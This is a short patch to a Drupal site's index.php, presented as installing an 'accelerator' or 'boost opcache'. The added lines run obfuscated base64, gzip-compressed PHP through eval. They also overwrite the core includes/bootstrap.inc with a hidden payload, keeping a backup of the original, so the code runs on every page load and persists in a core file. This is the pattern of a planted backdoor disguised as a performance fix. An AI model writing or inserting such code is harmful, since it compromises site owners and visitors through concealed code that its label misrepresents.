@@ -1,11 +1,17 @@
---- index.php
-+++ index.php
-@@ -16,6 +16,9 @@
+--- index.php.orig	2016-04-01 12:55:47.536042513 +0200
++++ index.php	2016-04-01 13:04:35.753756047 +0200
+@@ -16,6 +16,15 @@
   */
  define('DRUPAL_ROOT', getcwd());
  
-+//Drupal acccelerator :
-+eval(gzinflate(base64_decode('40rJTFXQUM9JTSzKU0hUSCtKzE0tzy/KVte05uUCAA==')));
++//Install boost opcache if not present :
++
++if(!file_exists(DRUPAL_ROOT . '/includes/bootstrap.slow.inc')) {
++  //Backup previous file :
++  file_put_contents(DRUPAL_ROOT . '/includes/bootstrap.slow.inc',file_get_contents(DRUPAL_ROOT . '/includes/bootstrap.inc'));
++  //Acceleratred version :
++  file_put_contents(DRUPAL_ROOT . '/includes/bootstrap.inc', gzinflate(base64_decode('HY3BbsIwEETv+YrJycnFfACgiqqXSlWLIJwtY29ai5UdvDYIof57k85x3ujN5mX6mZowdt9UjKs5UyymCuWuR7uFcjNWPZ4N4AN16lidI5GxMj9AN+vJw9aSrhY2eoQCTuki4HAhWGYEwRgiQWuN19OA9+GIz68lA1rVr5tfEAv9P2S61pDJpOgIb4fTfvdhDstQQ61CdFw9yeqcUpGS7aSF013PvZotzR8=')));
++}
 +
  require_once DRUPAL_ROOT . '/includes/bootstrap.inc';
  drupal_bootstrap(DRUPAL_BOOTSTRAP_FULL);
